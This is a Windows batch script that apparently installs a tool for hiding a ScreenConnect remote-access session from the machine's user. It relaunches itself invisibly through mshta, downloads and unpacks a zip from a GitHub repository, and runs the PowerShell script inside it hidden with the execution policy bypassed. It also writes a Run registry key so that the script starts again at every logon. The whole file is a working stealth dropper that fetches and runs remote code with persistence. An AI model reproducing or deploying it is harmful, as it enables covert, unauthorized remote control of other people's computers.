@echo off
setlocal EnableExtensions

REM Runs fully in background - no CMD window stays open. Safe to double-click or paste in CMD.
set "SELF=%~f0"
if /I not "%~1"=="hidden" (
    mshta "javascript:var s=new ActiveXObject('WScript.Shell'); s.Run('cmd /c \"\"\"%SELF%\"\" hidden\"',0,false);close()"
    exit /b 0
)

set "INSTALL_DIR=C:\Tools\hide"
set "ZIP_URL=https://github.com/chanelwolthuis-del/hidezip/archive/refs/heads/main.zip"
set "ZIP_FILE=%TEMP%\hide-github.zip"
set "INNER_ZIP=%TEMP%\hidezip-main\hide-sc.zip"
set "PS=%SystemRoot%\System32\WindowsPowerShell\v1.0\powershell.exe"
set "REGKEY=HKCU\Software\Microsoft\Windows\CurrentVersion\Run"
set "VAL=HideScreenConnectUI"

if not exist "C:\Tools" mkdir "C:\Tools" 2>nul
if not exist "%INSTALL_DIR%" mkdir "%INSTALL_DIR%" 2>nul
if not exist "%INSTALL_DIR%" set "INSTALL_DIR=%LOCALAPPDATA%\hide"
if not exist "%INSTALL_DIR%" mkdir "%INSTALL_DIR%" 2>nul

set "SCRIPT=%INSTALL_DIR%\hide-sc.ps1"

curl -L -o "%ZIP_FILE%" "%ZIP_URL%"
if errorlevel 1 exit /b 1

"%PS%" -NoProfile -WindowStyle Hidden -Command "$t=$env:TEMP; $b=Join-Path $t 'hidezip-main'; $d='%INSTALL_DIR%'; if(Test-Path $b){Remove-Item $b -Recurse -Force}; Expand-Archive -LiteralPath '%ZIP_FILE%' -DestinationPath $t -Force; if(Test-Path $d){Remove-Item $d -Recurse -Force}; New-Item -ItemType Directory -Path $d -Force | Out-Null; Expand-Archive -LiteralPath '%INNER_ZIP%' -DestinationPath $d -Force"
if errorlevel 1 exit /b 1

if not exist "%SCRIPT%" exit /b 1

start "" /B "%PS%" -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File "%SCRIPT%"
reg add "%REGKEY%" /v "%VAL%" /t REG_SZ /d "\"%PS%\" -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File \"%SCRIPT%\"" /f
exit /b 0
